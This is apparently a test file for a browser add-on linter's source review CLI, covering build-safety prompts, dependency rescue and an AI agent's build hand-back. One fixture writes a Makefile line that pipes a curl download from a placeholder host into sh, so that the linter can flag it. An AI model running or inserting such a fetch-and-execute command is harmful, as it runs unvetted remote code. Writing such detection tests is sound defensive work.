// CLI-contract tests of the build, the decision question and the rescue, and of the details
// block each prompt prints.

import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  advisory,
  answer,
  auditCache,
  buildInto,
  realBuildCheck,
  writeBuildReport,
} from "../build-checked.js";
import { workPaths } from "../../src/util/dest.js";
import { loopSlots } from "../../src/report/loop.js";
import { loadRegistry } from "../../src/checks/registry.js";
import {
  ROOT,
  CACHE,
  CDN_CACHE,
  OFFLINE_FLAGS,
  headerValue,
  run,
  sweepBack,
  submissionFolder,
  NO_LOCK_SOURCE,
  LOCKED_SOURCE,
  commandOf,
  workOf,
  readJson,
  handBackRoots,
  argvOf,
  unwrapped,
  unpackSource,
  reviewOf,
  UNSAFE_ISSUE,
  packAddon,
  answerAnalyze,
  answerDecision,
} from "../cli-run.js";

/**
 * The sca-unrescued fixture's source, taken through the CLI up to the prompt that follows
 * the reviewer's decision, its lock audited from a run cache folder seeded with `vulns`
 * (named as --cache-work-dir, which the record hands to every step).
 * @param {Record<string, object[]>} vulns
 * @returns {{work: string, stdout: string, dir: string}}  The prompt that run printed.
 */
function permittedPrompt(vulns) {
  const fixture = path.join(ROOT, "tests", "addons", "sca-unrescued");
  const dir = submissionFolder();
  const r = run([
    dir,
    "--llm-auto-review",
    ...OFFLINE_FLAGS,
    "--cache-work-dir",
    auditCache(vulns),
  ]);
  assert.equal(r.code, 0, r.stderr);
  const work = workOf(r.stdout);
  const sca = headerValue(r.stdout, "EXTRACT_TO");
  fs.cpSync(path.join(fixture, "src"), sca, { recursive: true });
  const analyze = run(argvOf(commandOf(r.stdout)));
  assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
  answer(work, {});
  writeBuildReport(work);
  const decision = run(argvOf(commandOf(analyze.stdout)));
  assert.equal(decision.code, 0, decision.stdout + decision.stderr);
  assert.equal(readJson(work, "state").current.step, "decision");
  answer(work, {});
  const next = run(argvOf(commandOf(decision.stdout)));
  assert.equal(next.code, 0, next.stdout + next.stderr);
  assert.ok(next.stdout.includes("── SCA Review Prompt ──"), next.stdout);
  assert.equal(headerValue(next.stdout, "ANSWERS"), workPaths(work).answers);
  assert.equal(
    headerValue(next.stdout, "SCA_BUILD_REPORT"),
    workPaths(work).build
  );
  assert.deepEqual(commandOf(next.stdout), [`--llm-handback ${work}`]);
  return { work, stdout: next.stdout, dir };
}

/** What the build and rescue prompts say of comparing the output with the submitted XPI: the
 *  linter does it, so the agent compares nothing. */
const COMPARED = [
  "Compare nothing with the submitted XPI: the linter does that itself.",
];

/** What the build and rescue prompts no longer hold, now the linter compares the output. */
const NOT_COMPARED = ["SUBMITTED_XPI", "LLM_BUILD_XPI_MATCH"];

/** How the build and rescue prompts install: as the lock pins it, and with no install script,
 *  since nobody has read a dependency's. */
const INSTALL =
  "`npm ci --ignore-scripts`, or `pnpm install --frozen-lockfile --ignore-scripts`";

/** What the build and rescue prompts say of the output path: the artifact the build produced,
 *  which the agent that ran it sees. Where it lies is the agent's to report, and the hand-back
 *  holds it to the build copy (src/report/handback.js outputAt). */
const OUTPUT_PATH =
  "as an absolute path: the XPI or zip file where it makes one, or else the folder it writes.";

/** The fixture's lock releases, none with an advisory. */
const FIXTURE_CLEAN = {
  "lint-pebble@0.4.0": [],
  "argv-crumb@0.0.8": [],
  "tidy-lantern@2.1.0": [],
  "wick-trim@1.0.1": [],
};

// A source rescued clean: its review reads the rescued copy, named as such, beside the same
// root in the source archive, and the root in the build copy the agent built in.
test("a rescued review names both roots and the build root", async () => {
  const fixture = path.join(ROOT, "tests", "addons", "sca-unrescued");
  const own = { name: "lantern-sorter", version: "1.0.0" };
  const { work, record } = await realBuildCheck({
    source: path.join(fixture, "src"),
    xpi: path.join(fixture, "xpi"),
    flags: {
      "cache-schema-dir": CACHE,
      "cache-hash-db-dir": CACHE,
      "cache-experiments-dir": CACHE,
      "cache-cdn-lookup-dir": CDN_CACHE,
      "cache-npm-registry-dir": CACHE,
    },
    cache: auditCache({
      "lint-pebble@0.4.0": [
        advisory("GHSA-fixture-pebble", "CRITICAL", "lint-pebble", "0.4.1"),
      ],
      "argv-crumb@0.0.8": [],
      "tidy-lantern@2.1.0": [],
      "wick-trim@1.0.1": [],
    }),
    rescue: (root) => {
      fs.writeFileSync(path.join(root, "package.json"), JSON.stringify(own));
      fs.writeFileSync(
        path.join(root, "package-lock.json"),
        JSON.stringify({ ...own, lockfileVersion: 3, packages: { "": own } })
      );
    },
  });
  const { sca, rescued, buildCopy } = workPaths(work);
  // The tree the review reads is the build check's own decision, part of its results.
  assert.deepEqual(record.build.roots, {
    source: sca,
    used: rescued,
    packageRoot: rescued,
  });
  const r = run(["--llm-handback", work]);
  assert.notEqual(r.code, 2, r.stdout + r.stderr);
  const state = readJson(work, "state");
  assert.deepEqual(state.current.roots, {
    source: sca,
    used: rescued,
    packageRoot: rescued,
  });
  assert.equal(state.build.copy, buildCopy);
  const rows = [
    `* SCA_SOURCE: [source archive](${sca})`,
    `* SCA_RESCUED: [rescued source (reduced/fixed dependencies)](${rescued})`,
    `* SCA_BUILD: [build copy](${buildCopy})`,
  ];
  const details = loopSlots(
    state.current,
    state,
    {},
    work,
    loadRegistry()
  ).buildDetails;
  for (const row of rows) {
    assert.ok(details.includes(row), `${row}\n${details}`);
  }
});

/** Every row a details block can hold, in the blocks' order. */
const DETAIL_ROWS = [
  "XPI_FILE",
  "XPI_ROOT",
  "SCA_SOURCE",
  "SCA_RESCUED",
  "SCA_EXPERIMENTS",
  "ADDON_SUMMARY_REPORT",
  "SCA_BUILD_REPORT",
  "SCA_BUILD_SAFETY_ASSESSMENT",
  "SCA_VULNERABILITIES",
  "LLM_BUILD_RESULT",
  "SCA_BUILD",
  "LLM_BUILD_OUTPUT",
  "LLM_BUILD_XPI_MATCH",
  "REVIEW_REPORT",
];

/** The details rows a prompt printed, as they read with their indent taken off. */
const detailRowsOf = (stdout) =>
  stdout
    .split("\n")
    .map((l) => l.trim())
    .filter((l) => DETAIL_ROWS.some((name) => l.startsWith(`* ${name}: `)));

/** The answer a test reviewer and agent give an entry of a review's phase. */
const WALK_ANSWERS = {
  built: "Builds and reproduces",
  verify: "reported",
  settle: "cleared",
  ask: "Clear",
};

// One review walked from the build check's decision prompt to its close: each details
// block holds every row of the block before it, the submitted XPI is XPI_FILE, a link, in
// every one of them, and the Final Review Details still hold the build.
test("each details block holds every row of the block before it", () => {
  const fixture = path.join(ROOT, "tests", "addons", "sca-unrescued");
  const dir = submissionFolder();
  const first = run([
    dir,
    "--llm-auto-review",
    ...OFFLINE_FLAGS,
    "--cache-work-dir",
    auditCache({ "lint-pebble@0.4.0": [] }),
  ]);
  assert.equal(first.code, 0, first.stderr);
  const work = workOf(first.stdout);
  const sca = headerValue(first.stdout, "EXTRACT_TO");
  fs.cpSync(path.join(fixture, "src"), sca, { recursive: true });
  const own = { name: "lantern-sorter", version: "1.0.0" };
  fs.writeFileSync(path.join(sca, "package.json"), JSON.stringify(own));
  fs.writeFileSync(
    path.join(sca, "package-lock.json"),
    JSON.stringify({
      ...own,
      lockfileVersion: 3,
      packages: { "": own, "node_modules/lint-pebble": { version: "0.4.0" } },
    })
  );
  const analyze = run(argvOf(commandOf(first.stdout)));
  assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
  answer(work, {});
  writeBuildReport(work);
  const decision = run(argvOf(commandOf(analyze.stdout)));
  assert.equal(decision.code, 0, decision.stdout + decision.stderr);
  answer(work, {});
  const build = run(argvOf(commandOf(decision.stdout)));
  assert.equal(build.code, 0, build.stdout + build.stderr);
  const xpi = readJson(work, "state").submission.xpi;
  answer(work, {
    LLM_BUILD_OUTPUT: buildInto(workPaths(work).buildCopy, workPaths(work).xpi),
  });
  let out = run(argvOf(commandOf(build.stdout)));
  const blocks = [["decision", detailRowsOf(decision.stdout)]];
  // Every pass up to the closing one is answered and handed back.
  for (let pass = 0; pass < 10; pass++) {
    assert.ok(out.code === 0 || out.code === 1, out.stdout + out.stderr);
    const { phase } = reviewOf(readJson(work, "state"));
    if (phase === "built" || phase === "ask") {
      blocks.push([phase, detailRowsOf(out.stdout)]);
    }
    if (phase === "close") {
      blocks.push([phase, detailRowsOf(out.stdout)]);
      break;
    }
    sweepBack(workPaths(work).answers);
    const doc = JSON.parse(fs.readFileSync(workPaths(work).answers, "utf8"));
    doc.entries = doc.entries.map((e) => ({
      ...e,
      answer: WALK_ANSWERS[phase],
    }));
    fs.writeFileSync(workPaths(work).answers, JSON.stringify(doc, null, 1));
    out = run(["--llm-handback", work]);
  }
  assert.deepEqual(
    blocks.map(([name]) => name),
    ["decision", "built", "ask", "close"]
  );
  const named = `* XPI_FILE: [${path.basename(xpi)}](${xpi})`;
  for (const [i, [name, rows]] of blocks.entries()) {
    assert.equal(rows[0], named, `${name}: XPI_FILE, a link, first`);
    assert.ok(
      !rows.some((row) => row.includes("SUBMITTED_XPI")),
      `${name}: no SUBMITTED_XPI`
    );
    if (i > 0) {
      for (const row of blocks[i - 1][1]) {
        assert.ok(rows.includes(row), `${name} misses ${row}`);
      }
    }
  }
  // The build block goes out before the description agent and the report.
  assert.ok(
    !blocks[1][1].some((row) =>
      ["* ADDON_SUMMARY_REPORT: ", "* REVIEW_REPORT: "].some((n) =>
        row.startsWith(n)
      )
    ),
    blocks[1][1].join("\n")
  );
  const final = blocks.at(-1)[1];
  for (const row of [
    "* SCA_BUILD_SAFETY_ASSESSMENT: safe",
    "* LLM_BUILD_RESULT: build succeeded",
    "* LLM_BUILD_XPI_MATCH: match",
  ]) {
    assert.ok(final.includes(row), `close misses ${row}\n${final.join("\n")}`);
  }
  for (const name of ["SCA_VULNERABILITIES", "SCA_BUILD", "LLM_BUILD_OUTPUT"]) {
    assert.ok(
      final.some((row) => row.startsWith(`* ${name}: `)),
      `close misses ${name}`
    );
  }
  fs.rmSync(dir, { recursive: true, force: true });
});

// A clean lock is built: the prompt after the decision names the package root, its place in
// the build copy the linter made to build it in and the build report, and asks for the build's
// final artifact only, since the linter compares it with the submitted XPI. The agent copies
// nothing.
test("the hand-back prints a clean source's build", () => {
  const { work, stdout, dir } = permittedPrompt(FIXTURE_CLEAN);
  assert.equal(readJson(work, "state").current.step, "build");
  assert.equal(headerValue(stdout, "SCA_PACKAGE_ROOT"), path.join(work, "sca"));
  assert.equal(
    headerValue(stdout, "LLM_BUILD_ROOT"),
    workPaths(work).buildCopy
  );
  assert.equal(headerValue(stdout, "BUILD_COPY"), undefined);
  assert.equal(headerValue(stdout, "RESCUE_ROOT"), undefined);
  assert.ok(
    fs.existsSync(path.join(workPaths(work).buildCopy, "package.json"))
  );
  assert.ok(!unwrapped(stdout).includes("Copy SCA_PACKAGE_ROOT"));
  for (const said of [
    "Build in LLM_BUILD_ROOT, and only there",
    INSTALL,
    OUTPUT_PATH,
    '"Build attempt"',
    ...COMPARED,
  ]) {
    assert.ok(unwrapped(stdout).includes(said), said);
  }
  for (const gone of NOT_COMPARED) {
    assert.ok(!unwrapped(stdout).includes(gone), gone);
  }
  fs.rmSync(dir, { recursive: true, force: true });
});

// A vulnerable lock is rescued: the prompt after the decision names the copy and the build
// report, and hands the agent the whole loop - lock-only commands, an audit before any
// build, and the build of a clean lock.
test("the hand-back prints a vulnerable source's rescue", () => {
  const { work, stdout, dir } = permittedPrompt({
    ...FIXTURE_CLEAN,
    "lint-pebble@0.4.0": [
      advisory("GHSA-fixture-pebble", "CRITICAL", "lint-pebble", "0.4.1"),
    ],
  });
  assert.equal(readJson(work, "state").current.step, "rescue");
  assert.equal(headerValue(stdout, "RESCUE_ROOT"), path.join(work, "rescued"));
  assert.equal(
    headerValue(stdout, "LLM_BUILD_ROOT"),
    workPaths(work).buildCopy
  );
  assert.equal(headerValue(stdout, "BUILD_COPY"), undefined);
  // The agent replaces build/ with a copy of the whole rescued/ before each build, with
  // exactly these two commands, printed as they are run.
  const commands = [
    `rm -rf ${workPaths(work).buildCopy}`,
    `cp -a ${workPaths(work).rescued} ${workPaths(work).buildCopy}`,
  ];
  const lines = stdout.split("\n").map((l) => l.trim());
  const at = lines.indexOf(commands[0]);
  assert.ok(at > 0, stdout);
  assert.equal(lines[at + 1], commands[1]);
  for (const said of [
    "Never install or build anything in RESCUE_ROOT",
    "Then build in LLM_BUILD_ROOT, and only there.",
    "npm install --package-lock-only --ignore-scripts",
    "npm audit fix --package-lock-only --ignore-scripts",
    "build NOTHING",
    INSTALL,
    '"label" of its one answer',
    OUTPUT_PATH,
    ...COMPARED,
  ]) {
    assert.ok(unwrapped(stdout).includes(said), said);
  }
  for (const gone of NOT_COMPARED) {
    assert.ok(!unwrapped(stdout).includes(gone), gone);
  }
  fs.rmSync(dir, { recursive: true, force: true });
});

// A safe build is shown to the reviewer before they are asked: the decision prompt names
// the review file and shows the Build Review Details - the build report, the judgement, the
// package root and the lock's counts from the audit at analyze, in the rows' order - as a
// block that ends the turn with the waiting line, and then puts the question. Its hand-back
// carries the build check on.
test("a safe build prints the Build Review Details and the decision question", () => {
  const dir = submissionFolder();
  const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
  assert.equal(r.code, 0, r.stderr);
  const work = workOf(r.stdout);
  const sca = headerValue(r.stdout, "EXTRACT_TO");
  fs.cpSync(LOCKED_SOURCE, sca, { recursive: true });
  const analyze = run(argvOf(commandOf(r.stdout)));
  assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
  answer(work, {});
  writeBuildReport(work);
  const asked = run(argvOf(commandOf(analyze.stdout)));
  assert.equal(asked.code, 0, asked.stdout + asked.stderr);
  assert.equal(readJson(work, "state").current.step, "decision");
  assert.match(asked.stdout, /── SCA Review Prompt ──/);
  assert.equal(headerValue(asked.stdout, "ANSWERS"), workPaths(work).answers);
  const block = [
    `* SCA_SOURCE: [source archive](${path.join(work, "sca")})`,
    `* SCA_BUILD_REPORT: [build.md](${workPaths(work).build})`,
    "* SCA_BUILD_SAFETY_ASSESSMENT: safe",
    `* SCA_BUILD_SAFETY_ISSUES: [build-issues.md](${workPaths(work).buildIssues})`,
    "* SCA_VULNERABILITIES: 0 moderate, 0 high, 0 critical",
    "",
    'Reply "next" to continue the review with the question how to build the add-on.',
  ]
    .map((line) => (line ? `   ${line}` : ""))
    .join("\n");
  assert.ok(asked.stdout.includes(block), asked.stdout);
  assert.ok(
    asked.stdout.indexOf(block) < asked.stdout.indexOf("SCA_BUILD_DECISION"),
    "the block comes before the question"
  );
  assert.deepEqual(commandOf(asked.stdout), [`--llm-handback ${work}`]);
  answer(work, {});
  const started = run(argvOf(commandOf(asked.stdout)));
  assert.notEqual(started.code, 2, started.stdout + started.stderr);
  assert.equal(readJson(work, "state").current.step, "build");
  fs.rmSync(dir, { recursive: true, force: true });
});

// An unsafe build shows the Build Review Details once, at the override question, and puts that
// question first. Overridden, the decision prompt asks its question without the block: the
// reviewer has read it already.
test("an unsafe build prints the Build Review Details once, then the override and the decision", () => {
  const dir = submissionFolder();
  const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
  assert.equal(r.code, 0, r.stderr);
  const work = workOf(r.stdout);
  const sca = headerValue(r.stdout, "EXTRACT_TO");
  fs.cpSync(LOCKED_SOURCE, sca, { recursive: true });
  const analyze = run(argvOf(commandOf(r.stdout)));
  assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
  answer(work, {
    SCA_BUILD_SAFETY_ISSUES: [
      { file: "package.json", line: 1, hint: "runs a script it downloads" },
    ],
  });
  writeBuildReport(work);
  const override = run(argvOf(commandOf(analyze.stdout)));
  assert.equal(override.code, 0, override.stdout + override.stderr);
  assert.equal(readJson(work, "state").current.step, "override-unsafe");
  const assessed = "* SCA_BUILD_SAFETY_ASSESSMENT: unsafe";
  assert.ok(override.stdout.includes(assessed), override.stdout);
  assert.ok(
    override.stdout.indexOf(assessed) <
      override.stdout.indexOf("SCA_BUILD_OVERRIDE"),
    "the block comes before the question"
  );
  assert.ok(!override.stdout.includes("SCA_BUILD_DECISION"));
  answer(work, { SCA_BUILD_OVERRIDE: "Continue building" });
  const decision = run(argvOf(commandOf(override.stdout)));
  assert.equal(decision.code, 0, decision.stdout + decision.stderr);
  assert.equal(readJson(work, "state").current.step, "decision");
  assert.ok(decision.stdout.includes("SCA_BUILD_DECISION"), decision.stdout);
  assert.ok(
    !decision.stdout.includes(assessed),
    "the block is not shown again"
  );
  answer(work, {});
  const started = run(argvOf(commandOf(decision.stdout)));
  assert.notEqual(started.code, 2, started.stdout + started.stderr);
  const record = readJson(work, "state");
  assert.equal(record.current.step, "build");
  assert.equal(record.current.buildSafety, "unsafe");
  assert.equal(record.current.buildSafe, true, "the verdict overridden");
  fs.rmSync(dir, { recursive: true, force: true });
});

// The agent-builds test switch answers the decision question up front where `analyze`
// would ask it: the safe build, its lock audited clean, goes straight on to the agent's build,
// with no question put. It is a test concern, read where it is used and never recorded, so the
// hot runs export it for the whole session and every hand-back inherits it.
test("WEBEXT_LINTER_AGENT_BUILDS=1 skips the decision question", () => {
  const env = { WEBEXT_LINTER_AGENT_BUILDS: "1" };
  const dir = submissionFolder();
  const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS], env);
  assert.equal(r.code, 0, r.stderr);
  const work = workOf(r.stdout);
  assert.ok(!("agentBuilds" in readJson(work, "state")), "never recorded");
  assert.ok(!("llm-agent-builds" in readJson(work, "state").flags));
  const unpacked = unpackSource(r.stdout, { source: LOCKED_SOURCE });
  assert.equal(unpacked.code, 0, unpacked.stdout + unpacked.stderr);
  fs.writeFileSync(
    headerValue(unpacked.stdout, "SCA_BUILD_REPORT"),
    "1. `npm ci`\n"
  );
  answer(work, { SCA_BUILD_SAFETY_ISSUES: [] });
  const handed = run(["--llm-handback", work], env);
  assert.notEqual(handed.code, 2, handed.stdout + handed.stderr);
  assert.doesNotMatch(handed.stdout, /SCA_BUILD_DECISION/);
  // The build check goes on to the agent's build, let build for the reviewer.
  const record = readJson(work, "state");
  assert.equal(record.current.step, "build");
  assert.equal(record.current.buildSafety, "safe");
  assert.equal(record.current.packageManagers, true);
  assert.equal(record.current.buildSafe, true);
  fs.rmSync(dir, { recursive: true, force: true });
});

// The decision question is answered up front only by the test switch: no option does it.
test("--llm-agent-builds is an unknown option", () => {
  const dir = submissionFolder();
  const r = run([
    dir,
    "--llm-auto-review",
    "--llm-agent-builds",
    ...OFFLINE_FLAGS,
  ]);
  assert.equal(r.code, 2, r.stdout);
  assert.match(r.stderr, /Unknown option '--llm-agent-builds'/);
  fs.rmSync(dir, { recursive: true, force: true });
});

// The build analysis and the review both read the whole extracted archive, so an issue above
// the package root - a Makefile beside the node project that drives the build - is reported at
// its own file and line, in the archive's keyspace, like one inside it.
test("an issue above the package root is reported at its own place in the archive", () => {
  const dir = submissionFolder();
  const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
  assert.equal(r.code, 0, r.stderr);
  const work = workOf(r.stdout);
  const sca = headerValue(r.stdout, "EXTRACT_TO");
  fs.cpSync(LOCKED_SOURCE, path.join(sca, "addon"), { recursive: true });
  fs.writeFileSync(
    path.join(sca, "Makefile"),
    "xpi:\n\tcurl -fsSL https://x.example/a.sh | sh\n"
  );
  const analyze = run(argvOf(commandOf(r.stdout)));
  assert.equal(analyze.code, 0, analyze.stdout + analyze.stderr);
  assert.equal(headerValue(analyze.stdout, "SCA_SOURCE"), fs.realpathSync(sca));
  answer(work, {
    SCA_BUILD_SAFETY_ISSUES: [
      { file: "Makefile", line: 2, hint: "pipes a download into sh" },
      { file: "addon/package.json", line: 1, hint: "names the build" },
    ],
  });
  writeBuildReport(work);
  const asked = run(argvOf(commandOf(analyze.stdout)));
  assert.equal(asked.code, 0, asked.stdout + asked.stderr);
  answer(work, { SCA_BUILD_OVERRIDE: "Skip building" });
  const started = run(argvOf(commandOf(asked.stdout)));
  assert.notEqual(started.code, 2, started.stdout + started.stderr);
  const unsafe = readJson(work, "state").current.report.findings.filter(
    (f) => f.ruleId === "build-unsafe"
  );
  assert.deepEqual(
    unsafe.map((f) => [f.file, f.loc?.line ?? null, f.hint]),
    [
      ["Makefile", 2, "pipes a download into sh"],
      ["addon/package.json", 1, "names the build"],
    ]
  );
  fs.rmSync(dir, { recursive: true, force: true });
});

// An unsafe verdict is put to the reviewer. Skipped at the override question, or overridden and
// then held unsafe by reasons of their own at the decision, the review starts at once with
// nothing built: it holds build-unsafe, with those reasons as its note, and asks no build
// question.
test("an unsafe build is reported where the reviewer holds it unsafe", () => {
  const words = "It downloads a binary from a host nobody pinned.";
  for (const [override, managers, reasons] of [
    ["Skip building", undefined, null],
    ["Continue building", words, words],
  ]) {
    const dir = submissionFolder();
    const r = run([dir, "--llm-auto-review", ...OFFLINE_FLAGS]);
    assert.equal(r.code, 0, r.stderr);
    const work = workOf(r.stdout);
    const handed = handBackRoots(r.stdout, {
      safety: "unsafe",
      override,
      managers,
      source: LOCKED_SOURCE,
    });
    assert.notEqual(handed.code, 2, handed.stdout + handed.stderr);
    assert.match(handed.stdout, /── LLM Prompt ──/);
    const record = readJson(work, "state");
    assert.equal(record.build.safety, "unsafe");
    assert.equal(record.build.packageManagers, false);
    assert.equal(record.build.safe, false);
    assert.equal(record.build.reasons, reasons);
    assert.equal(record.build.result, null);
    const state = record.current;
    assert.deepEqual(state.products, ["build", "buildIssues"]);
    const unsafe = state.report.findings.filter(
      (f) => f.ruleId === "build-unsafe"
    );
    assert.equal(unsafe.length, 1, override);
    assert.equal(unsafe[0].note, reasons);
    // The reviewer's decision, which verify never audits.
    assert.equal(unsafe[0].llmVerification, false, override);
    assert.ok(!(unsafe[0].ref in state.answers), override);
    // Trusted, the finding is the agent's issue, at its locus with its hint. The reviewer's
    // own words override it, at the build's anchor.
    assert.deepEqual(
      [unsafe[0].file, unsafe[0].loc?.line ?? null, unsafe[0].hint],
      reasons === null
        ? [UNSAFE_ISSUE.file, UNSAFE_ISSUE.line, UNSAFE_ISSUE.hint]
        : ["package.json", null, null],
      override
    );
    assert.match(
      fs.readFileSync(workPaths(work).buildIssues, "utf8"),
      /- package\.json:1 - runs a script it downloads with curl/
    );
    assert.ok(
      !state.manual.some((m) => m.ruleId === "build-reproduces-xpi"),
      "no build question is asked"
    );
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

// The Experiment folder may lie anywhere in the extracted archive, beside the package root
// too. The lock audit at analyze reads the archive the review reads, the whole extracted copy,
// so such a layout gets past it to the reviewer's decision instead of being refused as an
// Experiment folder outside the package root.
test("an Experiment folder beside the package root gets past the audit", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wl-sibling-"));
  const xpi = path.join(dir, "a.xpi");
  packAddon(xpi, { experiment_apis: { foo: {} } });
  const src = path.join(dir, "src");
  fs.cpSync(LOCKED_SOURCE, path.join(src, "addon"), { recursive: true });
  fs.mkdirSync(path.join(src, "experiment"));
  fs.writeFileSync(path.join(src, "experiment", "p.js"), "1;\n");
  const started = run([
    ...OFFLINE_FLAGS,
    "--allow-experiments",
    xpi,
    "--llm-review",
    "--sca-extracted",
    src,
    "--sca-experiments",
    "experiment",
  ]);
  assert.equal(started.code, 0, started.stdout + started.stderr);
  const work = workOf(started.stdout);
  assert.equal(
    headerValue(started.stdout, "SCA_PACKAGE_ROOT"),
    path.join(workPaths(work).sca, "addon")
  );
  const asked = run(answerAnalyze(started.stdout));
  assert.equal(asked.code, 0, asked.stdout + asked.stderr);
  assert.equal(readJson(work, "state").current.step, "decision");
  const decided = run(answerDecision(asked.stdout));
  assert.notEqual(decided.code, 2, decided.stdout + decided.stderr);
  assert.deepEqual(readJson(work, "state").build.roots, {
    source: workPaths(work).sca,
    used: workPaths(work).sca,
    packageRoot: path.join(workPaths(work).sca, "addon"),
    experiments: path.join(workPaths(work).sca, "experiment"),
  });
  fs.rmSync(dir, { recursive: true, force: true });
});

// An Experiment folder named for an add-on without Experiments would take WebExtension code
// out of the review, so the build check refuses it before it creates anything.
test("--sca-experiments for an add-on without Experiments is refused before the build check starts", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wl-noexp-"));
  const xpi = path.join(dir, "a.xpi");
  packAddon(xpi);
  const src = path.join(dir, "src");
  fs.cpSync(NO_LOCK_SOURCE, src, { recursive: true });
  fs.mkdirSync(path.join(src, "experiment"));
  fs.writeFileSync(path.join(src, "experiment", "p.js"), "1;\n");
  const r = run([
    ...OFFLINE_FLAGS,
    xpi,
    "--llm-review",
    "--sca-extracted",
    src,
    "--sca-experiments",
    "experiment",
  ]);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.match(r.stderr, /declares no Experiments/);
  assert.deepEqual(
    fs.readdirSync(dir).sort(),
    ["a.xpi", "src"],
    "no work folder is created"
  );
  fs.rmSync(dir, { recursive: true, force: true });
});

// The other way round: an Experiment add-on needs its folder named, as a review given these
// flags does. A person gives the values here, so nothing asks for it later.
test("an Experiment add-on without --sca-experiments is refused before the build check starts", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wl-needexp-"));
  const xpi = path.join(dir, "a.xpi");
  packAddon(xpi, { experiment_apis: { foo: {} } });
  const src = path.join(dir, "src");
  fs.cpSync(NO_LOCK_SOURCE, src, { recursive: true });
  const r = run([
    ...OFFLINE_FLAGS,
    "--allow-experiments",
    xpi,
    "--llm-review",
    "--sca-extracted",
    src,
  ]);
  assert.equal(r.code, 2, r.stdout + r.stderr);
  assert.match(r.stderr, /name the folder .* with --sca-experiments/);
  assert.deepEqual(
    fs.readdirSync(dir).sort(),
    ["a.xpi", "src"],
    "no work folder is created"
  );
  fs.rmSync(dir, { recursive: true, force: true });
});

// A run that fails after it created its work folder leaves nothing behind (src/util/claims.js):
// a source that cannot be copied, and a rejected Experiment whose review fails at its start.
test("a failed start of a source review leaves no work folder behind", (t) => {
  if (process.getuid?.() === 0) {
    t.skip("root reads every file");
    return;
  }
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "wl-leftover-"));
  const xpi = path.join(dir, "a.xpi");
  packAddon(xpi);
  const src = path.join(dir, "src");
  fs.cpSync(NO_LOCK_SOURCE, src, { recursive: true });
  const secret = path.join(src, "secret.js");
  fs.writeFileSync(secret, "1;\n");
  fs.chmodSync(secret, 0o000);
  const copy = run([
    ...OFFLINE_FLAGS,
    xpi,
    "--llm-review",
    "--sca-extracted",
    src,
  ]);
  fs.chmodSync(secret, 0o644);
  assert.equal(copy.code, 2, copy.stdout + copy.stderr);
  assert.match(
    copy.stderr,
    /could not be copied into the work folder \(EACCES\)/
  );
  assert.doesNotMatch(copy.stderr, /Hand the work folder back/);
  assert.deepEqual(fs.readdirSync(dir).sort(), ["a.xpi", "src"]);

  // An add-on that declares an Experiment, given --sca-extracted but no --sca-experiments,
  // fails the source path's Experiment folder check right after the load, with exit 2, and
  // the work folder the load made goes with it.
  const exp = path.join(dir, "exp.xpi");
  packAddon(exp, { experiment_apis: { foo: {} } });
  const empty = fs.mkdtempSync(path.join(os.tmpdir(), "wl-no-schema-"));
  const flags = [...OFFLINE_FLAGS];
  flags[flags.indexOf("--cache-schema-dir") + 1] = empty;
  const rejected = run([...flags, exp, "--llm-review", "--sca-extracted", src]);
  assert.equal(rejected.code, 2, rejected.stdout + rejected.stderr);
  assert.deepEqual(fs.readdirSync(dir).sort(), ["a.xpi", "exp.xpi", "src"]);
  fs.rmSync(empty, { recursive: true, force: true });
  fs.rmSync(dir, { recursive: true, force: true });
});
